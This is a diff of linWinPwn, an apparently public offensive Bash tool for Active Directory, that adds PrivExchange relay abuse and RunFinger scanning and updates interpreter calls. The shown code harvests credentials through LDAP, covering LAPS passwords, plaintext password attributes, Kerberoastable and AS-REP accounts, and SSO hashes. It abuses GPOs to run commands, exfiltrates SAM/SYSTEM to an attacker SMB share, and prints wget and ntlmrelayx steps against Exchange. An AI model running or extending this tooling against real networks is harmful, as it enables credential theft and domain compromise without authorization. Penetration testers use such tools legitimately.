@@ -94,12 +94,14 @@ LDAPWordlistHarvester="$scripts_dir/LDAPWordlistHarvester.py"
 rdwatool=$(which rdwatool)
 aced="$scripts_dir/aced-main/aced.py"
 sccmhunter="$scripts_dir/sccmhunter-main/sccmhunter.py"
-ldapper="$scripts_dir/ldapper.py"
+ldapper="$scripts_dir/ldapper/ldapper.py"
 orpheus="$scripts_dir/orpheus-main/orpheus.py"
 krbjack=$(which krbjack)
 adalanche="$scripts_dir/adalanche"
 pygpoabuse="$scripts_dir/pyGPOAbuse-master/pygpoabuse.py"
 GPOwned="$scripts_dir/GPOwned.py"
+privexchange="$scripts_dir/privexchange.py"
+RunFinger="$scripts_dir/Responder/RunFinger.py"
 nmap=$(which nmap)
 john=$(which john)
 
@@ -111,7 +113,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.2 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.3 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -205,10 +207,10 @@ prepare (){
     dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
     dc_FQDN=${dc_NETBIOS}"."${dc_domain}
 
-    if [ -z "$dc_domain" ] ; then
+    if [ -z "$dc_info" ] ; then
         echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
         exit 1
-    elif [ "$dc_domain" == "$dc_ip" ] && [ -z "$domain" ]; then
+    elif [ -z "$dc_domain" ]; then
         echo -e "${RED}[-] Error finding DC's domain, please specify domain... ${NC}"
         exit 1
     else 
@@ -317,6 +319,7 @@ authenticate (){
         argument_manspider="-d ${domain} -u '' -p ''"
         argument_coercer="-d ${domain} -u '' -p ''"
         argument_bloodyad="-d ${domain} -u '' -p ''"
+        argument_privexchange="-d ${domain} -u '' -p ''"
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
     
     #Check if username is not provided
@@ -355,6 +358,7 @@ authenticate (){
         argument_mssqlrelay="-u ${user}@${domain} -p ''"
         argument_pygpoabuse="${domain}/${user}:''"
         argument_GPOwned="-d ${domain} -u ${user} -p ''"
+        argument_privexchange="-d ${domain} -u ${user} -p ''"
         pass_bool=false
         hash_bool=false
         kerb_bool=false
@@ -396,6 +400,7 @@ authenticate (){
         argument_mssqlrelay="-u ${user}@${domain} -p ${password}"
         argument_pygpoabuse="${domain}/${user}:${password}'"
         argument_GPOwned="-d ${domain} -u ${user} -p ${password}"
+        argument_privexchange="-d ${domain} -u ${user} -p ${password}"
         hash_bool=false
         kerb_bool=false
         unset KRB5CCNAME
@@ -454,6 +459,7 @@ authenticate (){
                 argument_mssqlrelay="-u ${user}@${domain} -hashes ${hash}"
                 argument_pygpoabuse=" -hashes ${hash} ${domain}/${user}"
                 argument_GPOwned="-d ${domain} -u ${user} -hashes ${hash}"
+                argument_privexchange="-d ${domain} -u ${user} --hashes ${hash}"
                 auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of ${user}${NC}"
             else
                 echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
@@ -568,6 +574,7 @@ authenticate (){
         mssqlrelay_verbose="-debug"
         adalanche_verbose="--loglevel Debug"
         argument_pygpoabuse="${argument_pygpoabuse} -vv"
+        argument_privexchange="${argument_privexchange} --debug"
     fi
     
     echo -e ${auth_string}
@@ -1054,15 +1061,15 @@ sccm_enum (){
             echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
             /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
-            run_command "$(which python) ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-            run_command "$(which python) ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+            run_command "$(which python3) ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+            run_command "$(which python3) ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
             if [[ ! $(grep 'SCCM doesn' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]] && [[ ! $(grep 'Traceback' ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt 2>/dev/null) ]]; then
-                run_command "$(which python) ${sccmhunter} show -users" 2>/dev/null | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python) ${sccmhunter} show -computers" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python) ${sccmhunter} show -groups" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
-                run_command "$(which python) ${sccmhunter} show -smb" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "$(which python3) ${sccmhunter} show -users" 2>/dev/null | tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "$(which python3) ${sccmhunter} show -computers" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "$(which python3) ${sccmhunter} show -groups" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
+                run_command "$(which python3) ${sccmhunter} show -smb" 2>/dev/null| tee -a ${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt
                 echo -e "${GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:${NC}"
-                echo -e "$(which python) ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
+                echo -e "$(which python3) ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
             fi
         fi
     fi
@@ -1080,37 +1087,37 @@ ldapper_enum (){
             echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
             echo -e "${CYAN}[*] Get all users${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '1' -f json > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '1' -f json > ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json
             /usr/bin/jq -r ".[].samaccountname" ${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Users/users_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '2' -f json > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '2' -f json > ${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all printers${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '3' -f json > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '3' -f json > ${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get all computers${NC}" 
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '4' -f json > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '4' -f json > ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json
             /usr/bin/jq -r ".[].dnshostname" ${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json 2>/dev/null > ${output_dir}/DomainRecon/Servers/servers_list_ldapper_${dc_domain}.txt
             echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '5' -f json > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '5' -f json > ${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get Domain Trusts${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '6' -f json > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '6' -f json > ${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '7' -f json > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '7' -f json > ${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '8' -f json > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '8' -f json > ${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '9' -f json > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '9' -f json > ${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '10' -f json > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '10' -f json > ${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json
             echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '11' -f json > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '11' -f json > ${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json
             echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '12' -f json > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '12' -f json > ${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "orclCommonAttribute" SSO password hash${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '13' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '13' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json
             echo -e "${CYAN}[*] Oracle "userPassword" SSO password hash${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '14' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '14' -f json > ${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json
             echo -e "${CYAN}[*] Get SCCM Servers${NC}"
-            run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '15' -f json > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
+            run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -m 0 -s '15' -f json > ${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json
         fi
     fi
     echo -e ""
@@ -1187,7 +1194,7 @@ aced_console (){
         else
             echo -e "${BLUE}[*] Launching aced${NC}"
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
-            run_command "$(which python) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
+            run_command "$(which python3) ${aced} ${argument_aced}@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a ${output_dir}/DomainRecon/aced_output_${dc_domain}.txt
         fi
     fi
     echo -e ""
@@ -1214,7 +1221,7 @@ ldapper_console (){
 
             read -p "> " custom_option </dev/tty
             if [[ ! ${custom_option} == "back" ]]; then
-                run_command "$(which python) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
+                run_command "$(which python3) ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip}" -s ${custom_option} | tee -a ${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt
             else
                 ad_menu
             fi
@@ -2128,6 +2135,50 @@ coercer_check () {
     echo -e ""
 }
 
+privexchange_check () {
+    if [ ! -f "${privexchange}" ] ; then
+        echo -e "${RED}[-] privexchange.py not found! Please verify the installation of privexchange${NC}"
+    else
+        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] privexchange does not support kerberos authenticaiton${NC}"
+        else
+            echo -e "${BLUE}[*] Use Exchange Web Services to call PushSubscription API using privexchange. Please specify hostname of Exchange server:${NC}"
+            if [ "${nullsess_bool}" == true ] ; then
+                echo -e "${YELLOW}[*] No credentials were provided, use ntlmrelayx and then modified httpattack.py, and then press ENTER to continue....${NC}"
+                echo -e "cd /home/USER/.local/pipx/venvs/impacket/lib/python3.XX/site-packages/impacket/examples/ntlmrelayx/attacks/httpattack.py"
+                echo -e "mv httpattack.py httpattack.py.old"
+                echo -e "wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/httpattack.py"
+                echo -e "sed -i 's/attacker_url = .*$/attacker_url = "\$ATTACKER_URL"/' httpattack.py"
+                echo -e "ntlmrelayx.py -t https://exchange.server.EWS/Exchange.asmx"
+                read -p "" </dev/tty
+            fi
+            target_exchange=""
+            read -p ">> " target_exchange </dev/tty
+            while [ "${target_exchange}" == "" ] ; do
+                echo -e "${RED}Invalid hostname.${NC} Please specify hostname of Exchange server:"
+                read -p ">> " target_exchange </dev/tty
+            done
+            set_attackerIP
+            run_command "$(which python3) ${privexchange} ${argument_privexchange} -ah ${attacker_IP} ${target_exchange}" | tee ${output_dir}/Vulnerabilities/privexchange_${dc_domain}.txt
+        fi
+    fi
+    echo -e ""
+}
+
+runfinger_check () {
+    if [ ! -f "${RunFinger}" ] ; then
+        echo -e "${RED}[-] RunFinger.py not found! Please verify the installation of RunFinger${NC}"
+    else
+        echo -e "${BLUE}[*] Using RunFinger.py${NC}"
+        smb_scan
+        current_dir=$(pwd)
+        cd ${output_dir}/Vulnerabilities
+        run_command "${RunFinger} -f ${servers_smb_list}" | tee -a ${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt
+        cd ${current_dir} 
+    fi
+    echo -e ""
+}
+
 ###### mssql_checks: MSSQL scan
 mssql_enum () {
     if [ ! -f "${windapsearch}" ] || [ ! -f "${impacket_GetUserSPNs}" ]; then
@@ -2342,7 +2393,7 @@ pygpo_abuse () {
         read -p ">> " command_input_gpoabuse </dev/tty
         if [ ! "${command_input_gpoabuse}" == "" ] ; then command_gpoabuse="-command ${command_input_gpoabuse}"; fi
         if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi            
-        run_command "$(which python) ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
+        run_command "$(which python3) ${pygpoabuse} ${argument_pygpoabuse} ${ldaps_param} -dc-ip ${dc_ip} -gpo-id ${target_gpoabuse} ${userbool_gpoabuse} ${command_gpoabuse}" 2>&1 | tee -a ${output_dir}/Modification/pygpoabuse_output.txt
     fi
     echo -e ""
 }
@@ -2446,6 +2497,7 @@ samsystem_dump () {
             echo -e "${PURPLE}[-] reg requires credentials${NC}"
         else
             smb_scan
+            set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
             echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support "lwpshare" "${output_dir}/Credentials/""
             read -p "" </dev/tty
@@ -2849,15 +2901,26 @@ modify_target () {
 }
 
 set_attackerIP(){
-    echo -e "Please choose your IP from the following options:"
-    attacker_IPlist=$(/usr/bin/hostname --all-ip-addresses)
-    echo -e "${YELLOW}[i]${NC} Attacker's list of IPs: $attacker_IPlist${NC}"
+    echo -e "Please choose the attacker's IPs from the following options:"
+    attacker_IPlist=($(/usr/bin/hostname -I))
+    for ip in "${attacker_IPlist[@]}"; do
+        echo -e "${YELLOW}${ip}${NC}"
+    done
     attacker_IP=""
     read -p ">> " attacker_IP </dev/tty
-    while [ "$attacker_IP" == *"$attacker_IPlist"* ] && [ ! "${attacker_IP}" == "" ]; do
-        echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list:"
-        echo -e "${YELLOW}[i]${NC} Attacker IPs: $attacker_IPlist${NC}"
+    for ip in "${attacker_IPlist[@]}"; do
+        if [[ "$ip" == $attacker_IP ]]; then
+            matched=true;
+        fi
+    done
+    while [[ ! $matched == true ]]; do
+        echo -e "${RED}Invalid IP.${NC} Please specify your IP from the list"
         read -p ">> " attacker_IP </dev/tty
+        for val in "${attacker_IPlist[@]}"; do
+            if [[ "$val" == $attacker_IP ]]; then
+                matched=true;
+            fi
+        done
     done
 }
 
@@ -3557,6 +3620,8 @@ vulns_menu () {
     echo -e "11) runasppl check using netexec"
     echo -e "12) RPC Dump and check for interesting protocols"
     echo -e "13) Coercer RPC scan"
+    echo -e "14) PushSubscription abuse using PrivExchange"
+    echo -e "15) RunFinger scan"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -3621,6 +3686,14 @@ vulns_menu () {
 
         13)
         coercer_check
+        vulns_menu;;
+
+        14)
+        privexchange_check
+        vulns_menu;;
+
+        15)
+        runfinger_check
         vulns_menu;;
 
         back)
@@ -4145,6 +4218,10 @@ config_menu () {
         if [ ! -x "${pygpoabuse}" ] ; then echo -e "${RED}[-] pygpoabuse is not executable${NC}"; else echo -e "${GREEN}[+] pygpoabuse is executable${NC}"; fi
         if [ ! -f "${GPOwned}" ] ; then echo -e "${RED}[-] GPOwned is not installed${NC}"; else echo -e "${GREEN}[+] GPOwned is installed${NC}"; fi
         if [ ! -x "${GPOwned}" ] ; then echo -e "${RED}[-] GPOwned is not executable${NC}"; else echo -e "${GREEN}[+] GPOwned is executable${NC}"; fi
+        if [ ! -f "${privexchange}" ] ; then echo -e "${RED}[-] privexchange is not installed${NC}"; else echo -e "${GREEN}[+] privexchange is installed${NC}"; fi
+        if [ ! -x "${privexchange}" ] ; then echo -e "${RED}[-] privexchange is not executable${NC}"; else echo -e "${GREEN}[+] privexchange is executable${NC}"; fi
+        if [ ! -f "${RunFinger}" ] ; then echo -e "${RED}[-] RunFinger is not installed${NC}"; else echo -e "${GREEN}[+] RunFinger is installed${NC}"; fi
+        if [ ! -x "${RunFinger}" ] ; then echo -e "${RED}[-] RunFinger is not executable${NC}"; else echo -e "${GREEN}[+] RunFinger is executable${NC}"; fi
         config_menu;;
 
         2)
